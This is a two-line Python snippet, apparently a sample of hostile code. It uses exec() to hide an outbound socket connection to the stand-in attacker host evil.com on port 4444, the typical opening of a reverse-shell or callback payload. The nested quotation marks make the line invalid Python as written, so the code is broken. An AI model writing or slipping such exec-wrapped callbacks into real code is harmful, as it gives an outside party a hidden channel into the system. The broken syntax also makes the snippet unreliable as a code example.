import os
exec("import socket; socket.socket().connect(("evil.com", 4444))")